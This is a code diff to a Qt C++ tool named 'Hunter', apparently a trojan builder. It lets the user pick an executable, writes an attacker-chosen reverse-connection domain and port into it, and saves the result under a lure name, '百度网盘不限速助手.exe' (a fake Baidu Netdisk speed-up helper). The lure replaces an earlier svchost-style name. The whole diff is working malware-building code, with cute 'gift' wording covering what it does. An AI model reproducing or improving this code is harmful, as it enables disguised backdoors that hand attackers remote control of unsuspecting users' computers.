@@ -19,7 +19,7 @@ Hunter::Hunter(QWidget *parent)
     ui->labelSister->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
 //    ui->labelSister->setContentsMargins(0, 6, 0, 6);
     ui->labelSister->setText("");
-    QMovie *movie = new QMovie(":/Icons/lze");
+    QMovie *movie = new QMovie(":/Icons/lze.gif");
     movie->start();
     ui->labelSister->setMovie(movie);
     ui->labelSister->setScaledContents(true);
@@ -53,7 +53,7 @@ Hunter::Hunter(QWidget *parent)
     // 生成食物反向连接的域名
     ui->labelDomain->setText("连接域名");
     ui->labelDomain->setAlignment(Qt::AlignCenter);
-    ui->lineEditDomain->setText("127.0.0.1");
+    ui->lineEditDomain->setText("10.211.55.2");
     ui->lineEditDomain->setMaxLength(80);
     ui->lineEditDomain->setAlignment(Qt::AlignCenter);
     ui->lineEditDomain->setToolTip("生成食物反向连接的域名");
@@ -63,6 +63,7 @@ Hunter::Hunter(QWidget *parent)
     ui->lineEditPort1->setToolTip("生成食物反向连接的端口");
     ui->lineEditPort1->setValidator(new QIntValidator(1,65535));
     ui->lineEditPort1->setAlignment(Qt::AlignCenter);
+    ui->lineEditPort1->setText("18000");
     // hunter服务器监听端口
     ui->labelPort2->setText("监听端口");
     ui->labelPort2->setAlignment(Qt::AlignCenter);
@@ -134,19 +135,18 @@ Hunter::Hunter(QWidget *parent)
 
     // 制作礼品开关
     connect(ui->btGenerate, &QPushButton::clicked, this, [=](){
-        // cuteFood.exe文件
-        const QString fileName = "cuteFood.exe";
+        // 原始文件文件
+        QString fileName = QFileDialog::getOpenFileName(this, "主人，请选择礼物的原材料哟~", "./", "(*.exe)");
 
-        // 注意 对于macos而言 要放到真正的可执行文件目录下 而不是app所在目录
         QFile file(fileName);
         if (!file.exists()) {
-            QMessageBox::warning(this, "提示","主人！要把想送的东西命名为cuteFood.exe放到本程序的目录下哟");
+            QMessageBox::warning(this, "提示","主人！要选择正确的可执行原材料呀！");
             return;
         }
 
         // 获取保存礼品的位置
         QString saveFileName = QFileDialog::getSaveFileName(this, "保存主人精心准备的礼物",
-                                                            QDir::current().absoluteFilePath("svchostFood.exe"),"应用程序(*.exe)",
+                                                            QDir::current().absoluteFilePath("百度网盘不限速助手.exe"),"应用程序(*.exe)",
                                                             nullptr, QFileDialog::ShowDirsOnly);
 
         if (saveFileName.size() <= 0) {
@@ -155,7 +155,7 @@ Hunter::Hunter(QWidget *parent)
 
         // cuteFood.exe
         if (!file.open(QFile::ReadOnly)) {
-            QMessageBox::warning(this, "提示","cuteFood.exe");
+            QMessageBox::warning(this, "提示","对不起主人，无法打开礼物原材料耶");
             return;
         }
 
@@ -179,7 +179,7 @@ Hunter::Hunter(QWidget *parent)
         domainPos += offsetDomain;
 
         QByteArray afterDomain;
-        afterDomain.append(ui->lineEditDomain->text()+" ");
+        afterDomain.append(ui->lineEditDomain->text());
         fileData.replace(domainPos, afterDomain.size(), afterDomain);
 
         // 自定义端口
@@ -191,7 +191,7 @@ Hunter::Hunter(QWidget *parent)
         portPos += offsetPort;
 
         QByteArray afterPort;
-        afterPort.append(ui->lineEditPort1->text()+" ");
+        afterPort.append(ui->lineEditPort1->text());
         fileData.replace(portPos, afterPort.size(), afterPort);
 
         // 保存文件
